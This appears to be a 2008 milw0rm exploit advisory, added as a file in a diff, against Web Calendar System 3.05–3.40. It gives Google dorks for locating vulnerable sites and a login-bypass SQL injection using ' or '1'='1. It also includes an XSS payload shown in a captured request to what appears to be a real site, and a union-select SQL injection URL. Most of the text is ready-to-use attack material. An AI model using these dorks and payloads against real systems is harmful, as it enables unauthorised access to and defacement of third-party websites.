@@ -1,0 +1,81 @@
+000000  00000     0000    0000  000  00 000000  0000000   0000  000000  00000
+ 0    0   0      0    0  0    0  0   0   0    0  0    0  0    0  0    0  0   0
+ 0    0   0     0  00 0 0        0  0    0    0  0      0  00 0  0    0  0    0
+ 0    0   0     0 0 0 0 0        0  0    0    0  0  0   0 0 0 0  0    0  0    0
+ 00000    0     0 0 0 0 0        0 0     00000   0000   0 0 0 0  00000   0    0
+ 0    0   0     0 0 0 0 0        000     0    0  0  0   0 0 0 0  0  0    0    0
+ 0    0   0     0  000  0        0  0    0    0  0      0  000   0  0    0    0
+ 0    0   0   0  0       0    0  0   0   0    0  0    0  0       0   0   0   0
+000000  0000000   000     0000  000  00 000000  0000000   000   000  00 00000
+
+
+
+[+] Script               : Web Calendar System v 3.22/3.40/3.05/3.23
+
+[+] Exploit Type         : Multiple Exploits (XSS + remote bypass Exploit+Remote SQL Injection )
+
+[+] Google Dork          : intitle:Web Calendar system v 3.40        inurl:.asp
+[+] Google Dork          : intitle:Web Calendar system v 3.22        inurl:.asp
+[+] Google Dork          : intitle:Web Calendar system v 3.23        inurl:.asp
+[+] Google Dork          : intitle:Web Calendar system v 3.05        inurl:.asp
+
+[+] Contact              : blackbeard-sql @ hotmail.fr \\ Damn u crawlers :s
+
+
+--//--> Exploit : 
+
+1) Remote Bypass Exploit :
+
+http://[website]/[script]/calendar.asp?DoAction=USER&Change=LOGINFORM
+
+username:' or '1'='1
+
+password:' or '1'='1
+
+2) Remote XSS exploit : 
+
+http://[website]/[script]/calendar.asp?Client=1&Lang=3&Search=1&DoAction=Calendar&View=Search
+
+POST /Calendar/calendar.asp?Client=1&Lang=3&Search=1&DoAction=Calendar&View=Search HTTP/1.1
+Host: www.southforkwatershed.org
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.0.4) Gecko/2008102920 Firefox 3.0.3
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://[website]/[script]/calendar.asp?Client=1&Lang=3&Search=1&DoAction=Calendar&View=Search
+Cookie: ASPSESSIONIDSABBQBTD=MMPLNBODFDNEKLCLBECLLJOC
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+SText=%3Cscript%3Ealert%28%27XSSed%27%29%3C%2Fscript%3E
+
+
+HTTP/1.x 200 OK
+Cache-Control: no-cache
+Date: Fri, 28 Nov 2008 11:45:08 GMT
+Pragma: no-cache
+Content-Type: text/html
+Expires: Fri, 28 Nov 2008 11:44:08 GMT
+Server: Microsoft-IIS/6.0
+MicrosoftOfficeWebServer: 5.0_Pub
+X-Powered-By: ASP.NET
+Content-Encoding: gzip
+Vary: Accept-Encoding
+Transfer-Encoding: chunked
+
+
+In simple words :
+
+POST :
+
+SText=<script>alert('Blackbeard is here')</script>
+
+3) Remote SQL injection:
+
+http://[website]/[script]/calendar.asp?DoAction=Calendar&Q_DATE=11/28/2008&View=Event&IDEvent=2824+union+select+1+from+msysobjects
+
+[peace xD]
+
+# milw0rm.com [2008-11-28]
